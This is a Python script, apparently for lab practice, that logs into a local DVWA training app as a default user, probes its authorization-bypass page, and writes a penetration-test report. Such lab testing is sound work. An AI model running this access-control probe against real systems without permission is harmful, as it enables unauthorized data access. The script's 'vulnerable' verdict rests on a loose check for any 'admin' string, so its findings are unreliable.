import requests
from bs4 import BeautifulSoup
import datetime
import html

class DVWAAuthorizationBypassTester:
    def __init__(self, base_url="http://localhost/dvwa"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_level = "low"
        self.test_results = []

    def login_as_regular_user(self):
        """Login to DVWA as regular user (gordonb/abc123)"""
        try:
            # Get login page to extract CSRF token
            login_url = f"{self.base_url}/login.php"
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Perform login as regular user
            login_data = {
                'username': 'gordonb',
                'password': 'abc123',
                'Login': 'Login',
                'user_token': user_token
            }
            
            response = self.session.post(login_url, data=login_data)
            
            if "Login failed" in response.text:
                print("[-] Login failed for regular user")
                return False
            
            print("[+] Successfully logged in as regular user (gordonb)")
            return True
            
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return False

    def set_security_level(self):
        """Set DVWA security level to low"""
        try:
            # Get security page to extract CSRF token
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract CSRF token
            user_token = soup.find('input', {'name': 'user_token'})['value']
            
            # Set security to low
            security_data = {
                'security': self.security_level,
                'seclev_submit': 'Submit',
                'user_token': user_token
            }
            
            response = self.session.post(security_url, data=security_data)
            
            if self.security_level in response.text:
                print(f"[+] Security level set to {self.security_level}")
                return True
            
            print("[-] Failed to set security level")
            return False
            
        except Exception as e:
            print(f"[-] Security level error: {str(e)}")
            return False

    def test_auth_bypass_vulnerability(self):
        """Test authorization bypass by logging in as Gordon and accessing auth bypass page"""
        print("[*] Testing authorization bypass vulnerability...")
        
        # Login as regular user
        if not self.login_as_regular_user():
            return False
            
        # Set security level
        if not self.set_security_level():
            return False
            
        auth_bypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        
        try:
            print("[*] Accessing auth bypass page without userid parameter...")
            
            # Access the page without any userid parameter
            response = self.session.get(auth_bypass_url)
            
            # Check what we get back
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response length: {len(response.text)} characters")
            
            # Check if we can see user data (the vulnerability)
            has_user_list = (
                "User ID" in response.text or
                "First name" in response.text or
                "Surname" in response.text
            )
            
            # Check if we can see ALL users including admin (the vulnerability)
            can_see_admin = (
                "Admin" in response.text or "admin" in response.text
            )
            
            result = {
                'test_type': 'Auth Bypass Page Access',
                'user_context': 'Regular User (gordonb)',
                'parameters': 'None',
                'status_code': response.status_code,
                'response_length': len(response.text),
                'has_user_list': has_user_list,
                'can_see_admin': can_see_admin,
                'vulnerable': can_see_admin
            }
            
            self.test_results.append(result)
            
            print(f"[*] Has user data: {has_user_list}")
            print(f"[*] Can see admin data: {can_see_admin}")
            
            if result['vulnerable']:
                print("[!] VULNERABLE: Regular user can see all users including admin data!")
                print("[!] This demonstrates broken access control!")
            else:
                print("[-] Access properly restricted")
                
        except Exception as e:
            print(f"[-] Error accessing auth bypass page: {str(e)}")
            self.test_results.append({
                'test_type': 'Auth Bypass Page Access',
                'user_context': 'Regular User (gordonb)',
                'error': str(e),
                'vulnerable': False
            })

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report_filename = f"OSCP_Report_DVWA_AuthBypass_Localhost_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        # Get test result
        if self.test_results:
            result = self.test_results[0]
            is_vulnerable = result.get('vulnerable', False)
        else:
            is_vulnerable = False
            
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - DVWA Authorization Bypass</title>
    <style>
        body {{
            font-family: 'Courier New', Courier, monospace;
            background-color: #ffffff;
            color: #000000;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        h1, h2, h3 {{
            color: #000080;
            border-bottom: 2px solid #000080;
            padding-bottom: 5px;
        }}
        h1 {{
            text-align: center;
            font-size: 2.5em;
        }}
        .header {{
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
        }}
        .section {{
            background-color: #f9f9f9;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }}
        .code-block {{
            background-color: #f0f0f0;
            border: 1px solid #ccc;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
            margin: 10px 0;
            font-size: 0.9em;
        }}
        .vulnerable {{
            color: #cc0000;
            font-weight: bold;
        }}
        .safe {{
            color: #006600;
            font-weight: bold;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            border: 1px solid #ccc;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background-color: #e0e0e0;
            color: #000080;
        }}
        tr:nth-child(even) {{
            background-color: #f0f0f0;
        }}
        .highlight {{
            background-color: #ffffcc;
            padding: 2px 4px;
            border-radius: 3px;
        }}
        .risk-high {{
            background-color: #ffe6e6;
            border-left: 4px solid #cc0000;
            padding: 10px;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Penetration Test Report</h1>
            <p><strong>Target:</strong> {self.base_url}/vulnerabilities/authbypass/</p>
            <p><strong>Date:</strong> {timestamp}</p>
            <p><strong>Author:</strong> Automated Security Agent</p>
            <p><strong>Classification:</strong> UNCLASSIFIED</p>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>This penetration test identified a critical broken access control vulnerability in the Damn Vulnerable Web Application (DVWA) Authorization Bypass section. Testing was performed by logging in as a regular user (gordonb/abc123) and accessing the authorization bypass page without any parameters.</p>
            """
        
        if is_vulnerable:
            html_content += """
            <div class="risk-high">
                <strong>Risk Level:</strong> HIGH
            </div>
            <p>The vulnerability allows regular users to view all user information including administrative accounts, demonstrating a complete failure of access controls.</p>
            """
        else:
            html_content += """
            <p><strong class="safe">No vulnerabilities detected.</strong> The application properly restricts access to user information based on authentication level.</p>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Vulnerability Details</h2>
            <table>
                <tr><th>Category</th><th>Details</th></tr>
                <tr><td><strong>Name</strong></td><td>Authorization Bypass / Broken Access Control</td></tr>
                <tr><td><strong>OWASP ID</strong></td><td>OTG-AUTHZ-002</td></tr>
                """
        
        if is_vulnerable:
            html_content += """
                <tr><td><strong>Risk Level</strong></td><td><span class="vulnerable">HIGH</span></td></tr>
                """
        else:
            html_content += """
                <tr><td><strong>Risk Level</strong></td><td><span class="safe">LOW</span></td></tr>
                """
        
        html_content += f"""
                <tr><td><strong>URL</strong></td><td>{self.base_url}/vulnerabilities/authbypass/</td></tr>
                <tr><td><strong>Description</strong></td><td>The application fails to implement proper access controls, allowing regular users to view information that should be restricted to administrators.</td></tr>
                <tr><td><strong>Impact</strong></td><td>Unauthorized access to sensitive user information, potential privilege escalation, and violation of data confidentiality principles.</td></tr>
                <tr><td><strong>Remediation</strong></td><td>Implement proper role-based access control (RBAC) and validate user permissions server-side for all sensitive operations.</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>Technical Analysis</h2>
            <h3>Testing Methodology</h3>
            <p>The test was conducted by:</p>
            <ol>
                <li>Logging into DVWA as regular user (gordonb/abc123)</li>
                <li>Setting security level to "Low"</li>
                <li>Accessing the Authorization Bypass page without any parameters</li>
                <li>Analyzing the response for unauthorized data access</li>
            </ol>
            """
        
        if self.test_results:
            result = self.test_results[0]
            html_content += f"""
            <h3>Test Results</h3>
            <table>
                <tr><th>Test Aspect</th><th>Value</th></tr>
                <tr><td>User Context</td><td>{html.escape(result.get('user_context', 'N/A'))}</td></tr>
                <tr><td>Parameters Used</td><td>{html.escape(result.get('parameters', 'N/A'))}</td></tr>
                <tr><td>Status Code</td><td>{result.get('status_code', 'N/A')}</td></tr>
                <tr><td>Response Length</td><td>{result.get('response_length', 'N/A')} characters</td></tr>
                <tr><td>Shows User List</td><td>{'Yes' if result.get('has_user_list', False) else 'No'}</td></tr>
                <tr><td>Can See Admin Data</td><td>{'Yes' if result.get('can_see_admin', False) else 'No'}</td></tr>
                <tr><td>Number of Users Visible</td><td>{result.get('user_count', 'N/A')}</td></tr>
                <tr><td><strong>Vulnerable</strong></td><td><span class="{'vulnerable' if result.get('vulnerable', False) else 'safe'}">{'YES' if result.get('vulnerable', False) else 'NO'}</span></td></tr>
            </table>
            """
        
        if is_vulnerable and self.test_results:
            result = self.test_results[0]
            html_content += """
            <h3>Proof of Concept</h3>
            <div class="code-block">
<span class="highlight">Attack Scenario:</span> Regular user accessing administrative user data
<span class="highlight">Request:</span> GET /dvwa/vulnerabilities/authbypass/ HTTP/1.1
<span class="highlight">Authentication:</span> Regular user session (gordonb/abc123)
<span class="highlight">Result:</span> Successfully retrieved list of all users including admin accounts
<span class="highlight">Vulnerability:</span> Broken Access Control
<span class="highlight">Impact:</span> Unauthorized access to sensitive user information
            </div>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Conclusion</h2>
            """
        
        if is_vulnerable:
            html_content += """
            <p>The test confirmed a critical broken access control vulnerability in DVWA's Authorization Bypass section. When logged in as a regular user and accessing the auth bypass page, the application returns information about ALL users including administrative accounts.</p>
            <p>This represents a fundamental failure in access control implementation where the application does not differentiate between regular users and administrators when displaying user information.</p>
            """
        else:
            html_content += """
            <p>The test found that the application properly implements access controls. When logged in as a regular user, access to the authorization bypass page is appropriately restricted and does not expose unauthorized user information.</p>
            """
        
        html_content += """
        </div>

        <div class="section">
            <h2>Recommendations</h2>
            <ol>
                <li><strong>Implement Role-Based Access Control:</strong> Ensure users can only access data appropriate to their role</li>
                <li><strong>Server-Side Validation:</strong> Always validate user permissions on the server side</li>
                <li><strong>Principle of Least Privilege:</strong> Grant users only the minimum required access</li>
                <li><strong>Regular Security Testing:</strong> Conduct periodic access control testing</li>
            </ol>
        </div>

        <div class="section">
            <h2>References</h2>
            <ul>
                <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema">OWASP Testing Guide - OTG-AUTHZ-002</a></li>
                <li><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">OWASP Top Ten - Broken Access Control</a></li>
                <li><a href="https://www.dvwa.co.uk/">DVWA Documentation</a></li>
            </ul>
        </div>
    </div>
</body>
</html>"""

        # Write report to file
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"[+] HTML report generated: {report_filename}")
        return report_filename

    def run_test(self):
        """Run the authorization bypass test"""
        print("[*] Starting DVWA Authorization Bypass Test")
        print(f"[*] Target: {self.base_url}/vulnerabilities/authbypass/")
        
        # Check if target is reachable
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code != 200:
                print("[-] Target not reachable")
                return False
        except Exception as e:
            print(f"[-] Cannot reach target: {str(e)}")
            return False
        
        # Test the auth bypass vulnerability
        self.test_auth_bypass_vulnerability()
        
        # Generate report
        report_file = self.generate_html_report()
        
        # Print summary
        if self.test_results:
            result = self.test_results[0]
            is_vulnerable = result.get('vulnerable', False)
        else:
            is_vulnerable = False
        
        print(f"\n[*] Test Summary:")
        if is_vulnerable:
            print("[!] CRITICAL: Authorization bypass vulnerability confirmed!")
            print("[!] Regular user can access unauthorized user data!")
        else:
            print("[+] No authorization bypass vulnerabilities detected.")
        print(f"[*] Report saved to: {report_file}")
        
        return True

if __name__ == "__main__":
    # Create tester instance
    tester = DVWAAuthorizationBypassTester()
    
    # Run the test
    tester.run_test()